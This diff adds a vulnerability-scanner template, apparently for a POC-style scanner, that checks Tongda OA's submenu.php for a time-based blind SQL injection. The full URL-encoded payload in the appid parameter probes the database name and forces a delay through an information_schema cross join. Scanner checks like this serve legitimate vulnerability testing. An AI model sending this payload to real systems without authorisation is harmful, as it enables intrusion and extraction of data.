@@ -1,0 +1,16 @@
+name: 通达OA-submenu-sql
+description: >-
+  sql注入
+alwaysExecute: false
+matchCount: 2
+rules:
+  - method: GET
+    path: "/pda/appcenter/submenu.php?appid=1%20and%20(substr(DATABASE(),1,1))=char(116)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)"
+    expression:
+      status: 200
+      sleep: 3
+  - method: GET
+    path: "/pda/appcenter/submenu.php?appid=1%20and%20(substr(DATABASE(),1,1))=char(116)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)"
+    expression:
+      status: 200
+      sleep: 3
